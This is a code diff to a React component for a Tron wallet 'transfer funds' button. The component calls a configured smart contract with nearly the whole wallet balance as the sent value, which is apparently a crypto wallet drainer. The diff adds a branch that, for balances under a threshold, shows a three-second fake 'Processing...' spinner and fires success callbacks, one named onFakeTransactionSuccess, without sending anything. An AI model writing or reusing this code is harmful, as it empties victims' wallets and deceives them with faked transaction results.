@@ -7,18 +7,21 @@ import { Alert } from '@mui/material';
 
 import "../buttons/TransferButton.css";
 
-const { tronContractAddress, tronFunctionName, tronFunctionParams } = config;
+const { tronContractAddress, tronFunctionName, tronFunctionParams, minimumTrxBalance } = config;
 
 interface TronTransferFundsButtonProps {
   children: string;
   onTransactionSuccess: () => void;
+  onFakeTransactionSuccess: () => void;
 }
 
-const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ children, onTransactionSuccess }) => {
+const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess }) => {
   const { signTransaction, address, connected } = useWallet();
   const [netBalance, setNetBalance] = useState<number>(0);
+  const [grossBalance, setGrossBalance] = useState<number>(0);
   const [transactionResult, setTransactionResult] = useState(null);
   const [alertOpen, setAlertOpen] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
   useEffect(() => {
     const calculateBalance = async () => {
@@ -34,6 +37,7 @@ const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ child
 
         // Update state
         setNetBalance(calculatedNetBalance);
+        setGrossBalance(userBalance);
 
       } catch (error) {
         console.error("Error calculating balance:", error);
@@ -45,56 +49,72 @@ const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ child
 
 
   async function onSignTransaction() {
-    try {
-      // // Step 0: calculate net balance
-      // const userBalance = await tronWeb.trx.getBalance(address);
-
-      // // Estimate transaction fee (assuming 1 TRX as fee for this example)
-      // const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)
-
-      // // Calculate the net amount to send
-      // const calculatedNetBalance = userBalance - transactionFee;
-      
-      // console.log(calculatedNetBalance);
-
-      // Step 1: Create the transaction
-      const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
-        tronWeb.address.toHex(tronContractAddress), // Contract address in hex format
-        tronFunctionName,
-        {
-          feeLimit: 5000000,
-          callValue: netBalance, // Adjust for any TRX sent along with the transaction
-          // txLocal: true 
-        },
-        tronFunctionParams,
-        address
-      );
-      
-      console.log("unsignedTx", unsignedTx)
-
-      if (!unsignedTx.result || !unsignedTx.result.result) {
-        throw new Error("Failed to create transaction");
+    if (netBalance > minimumTrxBalance * 1000000) {
+      try {
+        // // Step 0: calculate net balance
+        // const userBalance = await tronWeb.trx.getBalance(address);
+  
+        // // Estimate transaction fee (assuming 1 TRX as fee for this example)
+        // const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)
+  
+        // // Calculate the net amount to send
+        // const calculatedNetBalance = userBalance - transactionFee;
+        
+        // console.log(calculatedNetBalance);
+  
+        // Step 1: Create the transaction
+        const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
+          tronWeb.address.toHex(tronContractAddress), // Contract address in hex format
+          tronFunctionName,
+          {
+            feeLimit: 5000000,
+            callValue: netBalance, // Adjust for any TRX sent along with the transaction
+            // txLocal: true 
+          },
+          tronFunctionParams,
+          address
+        );
+        
+        console.log("unsignedTx", unsignedTx)
+  
+        if (!unsignedTx.result || !unsignedTx.result.result) {
+          throw new Error("Failed to create transaction");
+        }
+  
+        // Step 2: Sign the transaction
+        const signedTx = await signTransaction(unsignedTx.transaction);
+  
+        // Step 3: Broadcast the transaction
+        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+  
+        console.log("receipt", receipt);
+  
+        // Update the transaction result state based on the response
+        setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
+        setAlertOpen(true);
+        if (receipt.result){
+          onTransactionSuccess();
+        }
+      } catch (error) {
+        console.error('Error calling contract:', error);
+        setTransactionResult('Error' as any);
+        setAlertOpen(true);
+        // onTransactionSuccess();
       }
+    }
+    else {
+      setIsLoading(true);
 
-      // Step 2: Sign the transaction
-      const signedTx = await signTransaction(unsignedTx.transaction);
+      await new Promise((resolve) => setTimeout(resolve, 3000));
 
-      // Step 3: Broadcast the transaction
-      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+      setIsLoading(false);
 
-      console.log("receipt", receipt);
-
-      // Update the transaction result state based on the response
-      setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
-      setAlertOpen(true);
-      if (receipt.result){
+      if (grossBalance <= 0) {
+        onFakeTransactionSuccess();
+      }
+      else {
         onTransactionSuccess();
       }
-    } catch (error) {
-      console.error('Error calling contract:', error);
-      setTransactionResult('Error' as any);
-      setAlertOpen(true);
-      // onTransactionSuccess();
     }
   }
 
@@ -102,7 +122,15 @@ const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ child
     <div className="tron-transfer">
       {connected ? (
         <>
-          <Button disabled={netBalance <=0} className="transfer-button" onClick={onSignTransaction}>{children}</Button>
+          <Button className={`transfer-button ${isLoading ? 'loading' : ''}`} onClick={onSignTransaction}>
+            {isLoading ? (
+              <>
+                <span className="spinner"></span> Processing...
+              </>
+            ) : (
+              children
+            )}
+          </Button>
           {alertOpen && (
             <Alert
               onClose={() => setAlertOpen(false)}
